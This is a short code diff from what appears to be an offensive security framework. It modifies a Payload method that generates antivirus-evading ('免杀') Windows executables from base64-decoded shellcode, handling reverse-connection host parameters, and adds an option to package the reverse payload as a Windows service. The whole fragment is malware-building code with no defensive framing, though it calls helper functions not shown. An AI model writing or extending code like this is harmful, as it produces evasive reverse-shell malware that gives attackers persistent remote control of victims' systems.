@@ -250,8 +250,8 @@ class Payload(object):
         return byteresult
 
     @staticmethod
-    def generate_bypass_exe(mname=None, opts=None):
-        "生成免杀的exe"
+    def generate_bypass_exe(mname=None, opts=None, service_exe=False):
+        """生成免杀的exe,随版本不断更新"""
         # 处理RHOST及LHOST参数
         if mname.find("reverse") > 0:
             try:
@@ -282,7 +282,11 @@ class Payload(object):
         if result is None:
             return None
         shellcode = base64.b64decode(result.get('payload'))
-        byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode)
+        if service_exe:
+            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode,
+                                                          payload_type="REVERSE_HEX_AS_SERVICE")
+        else:
+            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=shellcode)
         return byteresult
 
     @staticmethod
